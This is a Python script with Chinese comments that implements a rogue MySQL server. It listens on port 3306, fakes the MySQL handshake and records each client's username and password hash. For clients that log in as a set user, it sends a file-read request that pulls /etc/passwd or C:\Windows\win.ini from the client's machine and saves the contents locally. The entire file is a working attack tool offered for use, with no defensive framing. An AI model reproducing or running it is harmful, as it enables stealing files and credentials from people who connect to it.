#!/usr/bin/python
# coding: utf8
import subprocess
import os
import re
import platform
import socket
import datetime

def get_os(target_ip):
    # 判断操作系统
    system = platform.system()
    ping_cmd = None
    ttl_value = ''
    # 构建 ping 命令
    if system == "Windows":
        ping_cmd = ["ping", "-n", "1", target_ip]
    else:
        ping_cmd = ["ping", "-c", "1", target_ip]
    # 执行 ping 命令
    try:
        ping_output = subprocess.check_output(ping_cmd).decode()
    except subprocess.CalledProcessError:
        return None
    # 解析 TTL 值
    match = re.search(r"ttl=(\d+)", ping_output)
    if match:
        ttl_value = match.group(1)
    if ttl_value in ['32','128']:
        return "win"
    else:
        return "linux"


# Linux:
linux_file = "/etc/passwd"
# Windows:
win_file = r"C:\Windows\win.ini"

VALID_USERNAME = "cccccc"
# 将 raw_input 替换为 input，并将输入转换为 bytes
filestring = linux_file.encode('utf-8')
filestring1 = win_file.encode('utf-8')
# 计算负载长度，注意要转换为字节
payloadlen = bytes([len(filestring) + 1])
payloadlen1 = bytes([len(filestring1) + 1])
padding = b"\x00\x00\x01\xfb"
linuxpayload = payloadlen + padding + filestring
winpayload = payloadlen1 + padding + filestring1

HOST = "0.0.0.0"
PORT = 3306
BUFFER_SIZE = 4096

#  握手包
greeting = b"\x5b\x00\x00\x00\x0a\x35\x2e\x36\x2e\x32\x38\x2d\x30\x75\x62\x75\x6e\x74\x75\x30\x2e\x31\x34\x2e\x30\x34\x2e\x31\x00\x2d\x00\x00\x00\x40\x3f\x59\x26\x4b\x2b\x34\x60\x00\xff\xf7\x08\x02\x00\x7f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x68\x69\x59\x5f\x52\x5f\x63\x55\x60\x64\x53\x52\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00"
#  身份验证成功
authok = b"\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00"

# 登陆失败
auth_failed = b"\xff\x23\x00" + b"#HY000" + b"Access denied for user 'user'@'localhost' (using password: YES)"

#  负载

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST, PORT))
s.listen(1)

while True:

    print('[*] 服务器已准备好，等待客户端连接...')
    conn, addr = s.accept()
    if get_os(addr[0]) == "win":
        payload = winpayload
    else:
        payload = linuxpayload

    print(f'连接来自: {addr}')

    conn.send(greeting)
    #解析认证消息
    while True:
        data = conn.recv(BUFFER_SIZE)

        # 解析客户端发送的认证包
        print("[*] 解析客户端认证消息...")
        # print(str(data))
        try:
            if len(data) < 4:
                print("[!] 数据过短，无法解析包头")
            else:
                # 解析包头
                packet_length = data[0] + (data[1] << 8) + (data[2] << 16)
                sequence_id = data[3]
                print(f"数据包长度: {packet_length}, 序列号: {sequence_id}")

                # 检查包体完整性
                if len(data) < 4 + packet_length:
                    print("[!] 包体不完整")
                else:
                    body = data[4:4 + packet_length]
                    offset = 0

                    # 解析客户端标志
                    client_flags = int.from_bytes(body[offset:offset + 4], 'little')
                    offset += 4

                    # 跳过最大包大小和字符集
                    max_packet_size = int.from_bytes(body[offset:offset + 4], 'little')
                    offset += 4
                    charset = body[offset]
                    offset += 1
                    reserved = body[offset:offset + 23]
                    offset += 23

                    # 提取用户名（以NULL结尾）
                    username_end = offset
                    while username_end < len(body) and body[username_end] != 0:
                        username_end += 1
                    username = body[offset:username_end].decode('utf-8', errors='replace')
                    offset = username_end + 1  # 跳过NULL

                    # 提取密码
                    client_secure_connection = (client_flags & 0x8000)  # 检查安全连接标志
                    password = b''
                    if client_secure_connection:
                        if offset < len(body):
                            password_len = body[offset]
                            offset += 1
                            password = body[offset:offset + password_len]
                            offset += password_len
                    else:
                        # 旧版本，以NULL结尾
                        password_end = offset
                        while password_end < len(body) and body[password_end] != 0:
                            password_end += 1
                        password = body[offset:password_end]
                        offset = password_end + 1

                    print(f"[+] 提取到的用户名: {username}")
                    print(f"[+] 提取到的密码（HEX）: {password.hex()}")

        except Exception as e:
            print(f"[!] 解析过程中出现错误: {e}")
        #写入日志文件
        current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open("login.log", "a", encoding="utf-8") as file:
            log_entry = f"{current_time}\t{username}\t{addr[0]}\t{addr[1]}\n"
            file.write(log_entry)
        #发送认证数据
        if username != VALID_USERNAME:
            # 构造动态错误消息
            error_msg = f"Access denied for user '{username}'@'{addr[0]}' (using password: YES)".encode(
                'utf-8') + b'\x00'
            error_code = 1045  # MySQL错误代码1045表示拒绝访问
            error_code_bytes = error_code.to_bytes(2, 'little')
            sql_state = b'#HY000'

            # 构造错误包体
            body = (
                    b"\xff"  # 错误包标识
                    + error_code_bytes  # 错误代码（小端）
                    + sql_state  # SQL状态标记和状态
                    + error_msg  # 错误消息（含NULL结尾）
            )

            # 计算包长度和序列号
            packet_length = len(body)
            sequence_id = 2  # 响应包的序列号应比客户端包+1
            header = (
                    packet_length.to_bytes(3, 'little')
                    + sequence_id.to_bytes(1, 'little')
            )

            # 组合完整错误包
            auth_failed_packet = header + body

            # 发送错误包并关闭连接
            conn.send(auth_failed_packet)
            print(f"[!] 认证失败，用户名: {username}")
            conn.close()
            break  # 跳出循环，不再处理当前连接

        else:
            conn.send(authok)
            data = conn.recv(BUFFER_SIZE)
            conn.send(payload)
            print("[*] 负载已发送！")

            data = conn.recv(BUFFER_SIZE)
            data = data[4:]

            # 如果没有数据则退出循环
            if not data:
                break
            print(f"收到的数据:\n{data}")
            directory = f"./{addr[0]}"
            if not os.path.exists(directory):
                os.makedirs(directory)

            # 生成文件名
            filestr = str(filestring)
            if ':' in  filestr:
                file_name = filestr.split('\\')[-1].strip("'")
            else:
                file_name = filestr.split('/')[-1].strip("'")

            # 保存数据到文件

            file_path = os.path.join(directory, file_name)
            with open(file_path, 'wb') as f:
                f.write(data)
            break  # 可选：如果需要多次循环，可以去掉这个 break

    conn.close()
